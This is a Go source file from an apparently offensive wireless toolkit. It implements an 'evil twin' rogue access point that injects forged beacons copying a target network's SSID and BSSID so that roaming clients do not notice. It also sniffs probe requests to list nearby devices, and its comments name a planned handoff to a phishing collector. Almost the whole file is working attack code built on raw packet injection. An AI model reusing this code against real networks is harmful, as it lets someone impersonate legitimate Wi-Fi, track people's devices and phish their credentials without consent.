//go:build linux

// Package wireless — evil twin rogue AP.
//
// Beacons are built by hand rather than shelling out to hostapd:
//   - no external config file, no process to babysit
//   - works on minimal Kali images where hostapd is missing
//   - beacons match the target BSSID byte-for-byte, so clients roaming
//     between the real AP and ours never notice the switch
//
// While beacons go out on the monitor iface, probe requests for the target
// SSID are sniffed from the same socket's RX path — every device that
// remembers the network announces itself before it even tries to join,
// which is a client inventory handed over for free.
//
// This file is beacon TX + probe RX. Association/handoff to the phishing
// collector is a separate ticket (36 or built on top of Program/phishing/).
package wireless

import (
	"context"
	"encoding/binary"
	"fmt"
	"net"
	"strings"
	"syscall"
	"time"
)

// EvilTwinOptions controls a rogue AP run.
type EvilTwinOptions struct {
	Iface       string        // monitor-mode iface
	SSID        string        // target SSID to spoof
	BSSID       string        // target BSSID (spoofed as source)
	Channel     int           // operating channel
	BeaconEvery time.Duration // beacon interval; 100ms is 802.11 standard
	Duration    time.Duration // total run; 0 = until ctx done
}

// ProbeHit is a client that broadcast a probe request for the target SSID.
type ProbeHit struct {
	TS       time.Time
	Client   net.HardwareAddr
	SSID     string
	RSSIsign int8 // -128..127; 0 when radiotap has no RSSI field
}

// EvilTwin beacons the target SSID/BSSID until ctx is done or Duration
// elapses, calling onProbe for every probe request that matches SSID.
func EvilTwin(ctx context.Context, opts EvilTwinOptions, onProbe func(ProbeHit)) error {
	if opts.Iface == "" {
		return fmt.Errorf("evil_twin: iface required")
	}
	if opts.SSID == "" {
		return fmt.Errorf("evil_twin: ssid required")
	}
	if len(opts.SSID) > 32 {
		return fmt.Errorf("evil_twin: ssid must be <= 32 bytes")
	}
	bssid, err := ParseMAC(opts.BSSID)
	if err != nil {
		return err
	}
	if opts.BeaconEvery <= 0 {
		opts.BeaconEvery = 100 * time.Millisecond
	}

	if !isMonitorMode(opts.Iface) {
		if err := enableMonitor(opts.Iface); err != nil {
			return fmt.Errorf("evil_twin: enable monitor: %w", err)
		}
	}
	if opts.Channel > 0 {
		setChannel(opts.Iface, opts.Channel)
	}

	ifi, err := net.InterfaceByName(opts.Iface)
	if err != nil {
		return fmt.Errorf("evil_twin: iface lookup: %w", err)
	}

	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(0x0003)))
	if err != nil {
		return fmt.Errorf("evil_twin: socket: %w", err)
	}
	defer syscall.Close(fd)

	sll := &syscall.SockaddrLinklayer{
		Protocol: htons(0x0003),
		Ifindex:  ifi.Index,
	}
	if err := syscall.Bind(fd, sll); err != nil {
		return fmt.Errorf("evil_twin: bind: %w", err)
	}

	beacon := buildBeacon(bssid, opts.SSID, opts.Channel)

	var deadline <-chan time.Time
	if opts.Duration > 0 {
		deadline = time.After(opts.Duration)
	}

	// beacons in a goroutine, probes read on this goroutine. both share fd:
	// TX via Sendto is safe concurrent with RX via Recvfrom.
	sendStop := make(chan struct{})
	go func() {
		t := time.NewTicker(opts.BeaconEvery)
		defer t.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-sendStop:
				return
			case <-t.C:
				_ = syscall.Sendto(fd, beacon, 0, sll)
			}
		}
	}()
	defer close(sendStop)

	stop := make(chan struct{})
	go func() {
		select {
		case <-ctx.Done():
			syscall.Shutdown(fd, syscall.SHUT_RD)
		case <-stop:
		}
	}()
	if opts.Duration > 0 {
		go func() {
			select {
			case <-deadline:
				syscall.Shutdown(fd, syscall.SHUT_RD)
			case <-stop:
			}
		}()
	}
	defer close(stop)

	buf := make([]byte, 65536)
	for {
		n, _, err := syscall.Recvfrom(fd, buf, 0)
		if err != nil {
			if err == syscall.EBADF || err == syscall.EINVAL || err == syscall.ENOTCONN {
				return nil
			}
			if err == syscall.EINTR {
				continue
			}
			return fmt.Errorf("evil_twin: recvfrom: %w", err)
		}
		if n < 24 {
			continue
		}
		hit, ok := parseProbeRequest(buf[:n], opts.SSID)
		if !ok {
			continue
		}
		if onProbe != nil {
			onProbe(hit)
		}
	}
}

// buildBeacon assembles radiotap + 802.11 beacon for the given SSID/BSSID.
//
// Frame layout:
//   radiotap (8B): version 0, len 8, present 0
//   mgmt hdr (24B): fc=0x0080 (beacon), addr1=ff:ff:ff:ff:ff:ff, addr2=bssid,
//                   addr3=bssid
//   fixed (12B):   timestamp(8) beacon-interval(2) capability(2)
//   IE: SSID (0x00, len, bytes)
//   IE: Supported Rates (0x01, 8, basic 1/2/5.5/11 + ext 6/9/12/18)
//   IE: DS Parameter Set (0x03, 1, channel)
func buildBeacon(bssid []byte, ssid string, channel int) []byte {
	rt := make([]byte, 8)
	rt[0] = 0x00
	rt[1] = 0x00
	binary.LittleEndian.PutUint16(rt[2:4], 8)
	binary.LittleEndian.PutUint32(rt[4:8], 0)

	hdr := make([]byte, 24)
	hdr[0] = 0x80 // frame control: mgmt, subtype beacon
	hdr[1] = 0x00
	copy(hdr[4:10], []byte{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF})
	copy(hdr[10:16], bssid)
	copy(hdr[16:22], bssid)

	fixed := make([]byte, 12)
	// timestamp left zero (clients don't validate it for our purpose)
	binary.LittleEndian.PutUint16(fixed[8:10], 100)   // beacon interval (TU ~102.4ms)
	binary.LittleEndian.PutUint16(fixed[10:12], 0x0431) // cap: ESS + privacy + short slot

	ssidIE := make([]byte, 0, 2+len(ssid))
	ssidIE = append(ssidIE, 0x00, byte(len(ssid)))
	ssidIE = append(ssidIE, []byte(ssid)...)

	ratesIE := []byte{0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24}

	ch := channel
	if ch <= 0 {
		ch = 1
	}
	dsIE := []byte{0x03, 0x01, byte(ch)}

	out := make([]byte, 0, len(rt)+len(hdr)+len(fixed)+len(ssidIE)+len(ratesIE)+len(dsIE))
	out = append(out, rt...)
	out = append(out, hdr...)
	out = append(out, fixed...)
	out = append(out, ssidIE...)
	out = append(out, ratesIE...)
	out = append(out, dsIE...)
	return out
}

// parseProbeRequest walks radiotap + 802.11 mgmt frame, matches a probe
// request (subtype 0x04) whose SSID IE equals the target, and returns the
// client MAC plus best-effort RSSI from radiotap if present.
func parseProbeRequest(raw []byte, wantSSID string) (ProbeHit, bool) {
	if len(raw) < 4 {
		return ProbeHit{}, false
	}
	rtLen := int(binary.LittleEndian.Uint16(raw[2:4]))
	rssi := int8(0)
	// parse radiotap present flags (first 4 bytes after len) for RSSI field
	if rtLen >= 8 && len(raw) >= 8 {
		present := binary.LittleEndian.Uint32(raw[4:8])
		if present&(1<<5) != 0 { // bit 5 = dBm Antenna Signal
			// rssi is the first field after radiotap header, aligned to 1B
			if len(raw) > rtLen {
				rssi = int8(raw[rtLen])
			}
		}
	}
	if rtLen < 8 || rtLen > len(raw)-24 {
		return ProbeHit{}, false
	}
	frame := raw[rtLen:]
	if len(frame) < 24 {
		return ProbeHit{}, false
	}
	if frame[0] != 0x40 { // mgmt, subtype probe request
		return ProbeHit{}, false
	}
	client := append(net.HardwareAddr(nil), frame[10:16]...)
	// probe request has no fixed fields — IEs start at offset 24
	ies := frame[24:]
	ssid, ok := findSSIDIE(ies)
	if !ok || ssid != wantSSID {
		return ProbeHit{}, false
	}
	return ProbeHit{TS: time.Now(), Client: client, SSID: ssid, RSSIsign: rssi}, true
}

func findSSIDIE(ies []byte) (string, bool) {
	i := 0
	for i+2 <= len(ies) {
		tag := ies[i]
		length := int(ies[i+1])
		if i+2+length > len(ies) {
			return "", false
		}
		if tag == 0x00 {
			return string(ies[i+2 : i+2+length]), true
		}
		i += 2 + length
	}
	return "", false
}

// IsBroadcastSSID reports whether an SSID is the wildcard (hidden) form.
func IsBroadcastSSID(s string) bool { return s == "" || strings.TrimSpace(s) == "" }
